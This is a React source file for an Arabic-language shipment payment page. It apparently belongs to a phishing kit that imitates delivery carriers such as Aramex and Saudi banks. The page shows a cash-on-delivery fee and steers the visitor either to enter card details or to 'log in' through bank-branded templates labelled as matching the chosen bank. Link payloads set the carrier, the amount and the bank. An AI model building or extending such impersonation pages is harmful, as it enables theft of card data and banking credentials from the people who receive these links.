import { type ReactNode, useEffect, useMemo, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card as Surface } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink } from "@/hooks/useSupabase";
import {
  ensurePaymentFlowLink,
  getPaymentBank,
  getPaymentMethod,
  PaymentMethod,
  setPaymentBank,
  setPaymentMethod,
  updatePaymentFlowState,
} from "@/lib/paymentFlow";
import { bankLoginTemplates } from "@/lib/bankLogins";
import { cn } from "@/lib/utils";
import {
  ArrowLeft,
  CheckCircle2,
  CreditCard,
  Hash,
  LogIn,
  Package,
  Shield,
  Truck,
} from "lucide-react";

const methodOptions: Array<{
  key: PaymentMethod;
  title: string;
  description: string;
  icon: ReactNode;
}> = [
  {
    key: "card",
    title: "الدفع ببيانات البطاقة",
    description: "إدخال بيانات البطاقة البنكية وإكمال التفويض",
    icon: <CreditCard className="w-6 h-6" />,
  },
  {
    key: "bank-login",
    title: "الدفع عبر تسجيل الدخول",
    description: "تسجيل الدخول إلى المصرف المطابق واستكمال عملية التحقق",
    icon: <LogIn className="w-6 h-6" />,
  },
];

const PaymentTracking = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading } = useLink(id);
  const [method, setMethodState] = useState<PaymentMethod>("card");
  const [selectedBank, setSelectedBankState] = useState<string | undefined>();
  const [error, setError] = useState<string>("");

  useEffect(() => {
    if (!id) return;
    ensurePaymentFlowLink(id);

    const storedMethod = getPaymentMethod(id) ?? "card";
    const storedBank = getPaymentBank(id);

    setMethodState(storedMethod);
    setSelectedBankState(storedBank);

    if (linkData?.payload) {
      const payload = linkData.payload as Record<string, unknown>;
      const payloadBank = (payload.bank_key || payload.bank || payload.bankKey) as string | undefined;
      if (!storedBank && payloadBank) {
        setSelectedBankState(payloadBank.toLowerCase());
        setPaymentBank(id, payloadBank.toLowerCase());
        updatePaymentFlowState(id, { bankKey: payloadBank.toLowerCase() });
      }
      if (payload && payload.payment_method) {
        const payloadMethod = (payload.payment_method as string).toLowerCase();
        if (payloadMethod === "login") {
          setMethodState("bank-login");
          setPaymentMethod(id, "bank-login");
        }
      }
    }
  }, [id, linkData]);

  const serviceKey = useMemo(() => {
    if (!linkData?.payload) return "aramex";
    const payload = linkData.payload as Record<string, any>;
    return (
      payload.service_key ||
      payload.service ||
      payload.carrier ||
      new URLSearchParams(typeof window !== "undefined" ? window.location.search : "").get("service") ||
      "aramex"
    ).toString().toLowerCase();
  }, [linkData]);

  const branding = getServiceBranding(serviceKey);
  const shippingInfo = (linkData?.payload || {}) as any;
  const serviceName = (linkData?.payload as any)?.service_name || shippingInfo?.carrier || serviceKey;
  const amount = shippingInfo?.cod_amount || shippingInfo?.total_amount || 0;
  const formattedAmount = amount ? `${amount} ر.س` : "—";

  const handleSelectMethod = (value: PaymentMethod) => {
    if (!id) return;
    setMethodState(value);
    setPaymentMethod(id, value);
    if (value === "card") {
      setSelectedBankState(undefined);
      setPaymentBank(id, undefined);
      updatePaymentFlowState(id, { bankKey: undefined });
    }
    setError("");
  };

  const handleSelectBank = (bankKey: string) => {
    if (!id) return;
    setSelectedBankState(bankKey);
    setPaymentBank(id, bankKey);
    updatePaymentFlowState(id, { bankKey });
    setError("");
  };

  const handleContinue = () => {
    if (!id) return;

    if (method === "bank-login" && !selectedBank) {
      setError("الرجاء اختيار البنك قبل المتابعة");
      return;
    }

    updatePaymentFlowState(id, {
      linkId: id,
      method,
      bankKey: selectedBank,
    });

    navigate(`/pay/${id}/recipient`);
  };

  const heroIcon = method === "card" ? <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" /> : <Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />;

  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="تتبع وتأكيد الدفع"
      description="راجع تفاصيل الشحنة وحدد طريقة الدفع المفضلة"
      icon={heroIcon}
    >
      <div className="space-y-6 sm:space-y-8">
        <Surface className="p-4 sm:p-6 bg-muted/40 border border-border">
          <div className="flex items-center justify-between mb-4">
            <div>
              <p className="text-sm text-muted-foreground">الخدمة</p>
              <h2 className="text-lg sm:text-xl font-bold capitalize">{linkData?.payload?.service_name || serviceKey}</h2>
            </div>
            <Badge
              className="text-xs sm:text-sm"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
              }}
            >
              آمنة ومشفرة
            </Badge>
          </div>

          <div className="grid sm:grid-cols-2 gap-3 sm:gap-4 text-sm">
            {shippingInfo?.tracking_number && (
              <div className="flex items-center gap-2">
                <Hash className="w-4 h-4 text-muted-foreground" />
                <span className="text-muted-foreground">رقم التتبع:</span>
                <span className="font-semibold">{shippingInfo.tracking_number}</span>
              </div>
            )}
            {shippingInfo?.package_description && (
              <div className="flex items-center gap-2">
                <Package className="w-4 h-4 text-muted-foreground" />
                <span className="text-muted-foreground">وصف الطرد:</span>
                <span className="font-semibold">{shippingInfo.package_description}</span>
              </div>
            )}
            {shippingInfo?.carrier && (
              <div className="flex items-center gap-2">
                <Truck className="w-4 h-4 text-muted-foreground" />
                <span className="text-muted-foreground">شركة الشحن:</span>
                <span className="font-semibold capitalize">{shippingInfo.carrier}</span>
              </div>
            )}
            {amount > 0 && (
              <div className="flex items-center gap-2">
                <CreditCard className="w-4 h-4 text-muted-foreground" />
                <span className="text-muted-foreground">المبلغ المستحق:</span>
                <span className="font-semibold" style={{ color: branding.colors.primary }}>
                  {formattedAmount}
                </span>
              </div>
            )}
          </div>
        </Surface>

        <div>
          <h3 className="text-base sm:text-lg font-semibold mb-3 sm:mb-4">اختر طريقة الدفع</h3>
          <div className="grid sm:grid-cols-2 gap-3 sm:gap-4">
            {methodOptions.map((option) => (
              <button
                key={option.key}
                type="button"
                onClick={() => handleSelectMethod(option.key)}
                className={cn(
                  "text-right p-4 sm:p-5 rounded-xl border transition-all",
                  method === option.key
                    ? "border-transparent text-primary-foreground shadow-lg"
                    : "border-border hover:border-primary/40"
                )}
                style={
                  method === option.key
                    ? {
                        background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                      }
                    : undefined
                }
              >
                <div className="flex items-center justify-between gap-3 mb-3">
                  <div className="flex items-center gap-3">
                    <div
                      className={cn(
                        "w-10 h-10 rounded-lg flex items-center justify-center",
                        method === option.key ? "bg-white/20" : "bg-muted"
                      )}
                    >
                      {option.icon}
                    </div>
                    <div>
                      <p className="font-semibold text-base">{option.title}</p>
                      <p className="text-xs text-muted-foreground/80">
                        {option.description}
                      </p>
                    </div>
                  </div>
                  {method === option.key && <CheckCircle2 className="w-5 h-5" />}
                </div>
              </button>
            ))}
          </div>
        </div>

        {method === "bank-login" && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h4 className="text-base font-semibold">اختر المصرف</h4>
              <span className="text-xs text-muted-foreground">تصميم مطابق للمصرف المختار</span>
            </div>
            <div className="grid gap-3 sm:grid-cols-2">
              {Object.values(bankLoginTemplates).map((template) => (
                <button
                  key={template.key}
                  type="button"
                  onClick={() => handleSelectBank(template.key)}
                  className={cn(
                    "relative overflow-hidden rounded-xl border text-right p-4 transition-all",
                    selectedBank === template.key ? "border-transparent shadow-xl" : "border-border hover:border-primary/40"
                  )}
                  style={
                    selectedBank === template.key
                      ? {
                          background: `linear-gradient(135deg, ${template.primaryColor}, ${template.secondaryColor})`,
                          color: "#fff",
                        }
                      : undefined
                  }
                >
                  {template.backgroundImage && (
                    <span
                      className="absolute inset-0 opacity-10"
                      style={{
                        backgroundImage: `url(${template.backgroundImage})`,
                        backgroundSize: "cover",
                      }}
                    />
                  )}
                  <div className="relative z-10 flex items-center justify-between gap-3">
                    <div className="flex items-center gap-3">
                      <div className="h-10 w-10 rounded-full bg-white/90 flex items-center justify-center">
                        <img
                          src={template.logo}
                          alt={template.nameAr}
                          className="h-8 w-8 object-contain"
                          onError={(e) => {
                            e.currentTarget.style.display = "none";
                          }}
                        />
                      </div>
                      <div>
                        <p className="text-sm font-semibold">{template.nameAr}</p>
                        <p
                          className={cn(
                            "text-xs",
                            selectedBank === template.key ? "text-white/80" : "text-muted-foreground"
                          )}
                        >
                          {template.tagline || template.nameEn}
                        </p>
                      </div>
                    </div>
                    {selectedBank === template.key && <CheckCircle2 className="w-5 h-5" />}
                  </div>
                </button>
              ))}
            </div>
          </div>
        )}

        {error && (
          <div className="rounded-lg border border-destructive/20 bg-destructive/10 p-3 text-sm text-destructive">
            {error}
          </div>
        )}

        <div className="space-y-3">
          <Button
            size="lg"
            className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
            onClick={handleContinue}
            disabled={isLoading}
            style={{
              background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
            }}
          >
            <span className="ml-2">متابعة</span>
            <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
          </Button>
          <p className="text-[10px] sm:text-xs text-center text-muted-foreground">
            بالتقدم، فإنك تؤكد مراجعة بيانات الشحنة وتوافق على المتابعة بالطريقة المحددة
          </p>
        </div>
      </div>
    </DynamicPaymentLayout>
  );
};

export default PaymentTracking;
